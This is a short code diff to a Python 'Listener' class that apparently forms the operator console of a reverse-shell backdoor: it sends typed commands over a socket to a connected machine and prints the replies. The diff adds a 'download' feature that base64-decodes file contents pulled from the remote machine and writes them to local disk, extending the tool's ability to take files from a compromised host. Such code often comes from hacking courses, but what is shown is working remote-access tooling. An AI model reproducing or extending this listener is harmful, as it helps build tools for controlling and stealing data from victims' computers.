@@ -1,5 +1,6 @@
 import socket
 import json
+import base64
 
 
 class Listener:
@@ -25,6 +26,11 @@ class Listener:
         json_obj = json.dumps(commands)
         self.conn.send(json_obj.encode())
 
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content.encode()))
+            return "[+] Download Successful"
+
     def run(self):
         while True:
             commands = input("=>").split(' ')
@@ -33,6 +39,8 @@ class Listener:
                 self.conn.close()
                 exit()
             results = self.recv_reliably()
+            if commands[0] == "download":
+                results = self.write_file(commands[1], results)
             print(results)
 
 
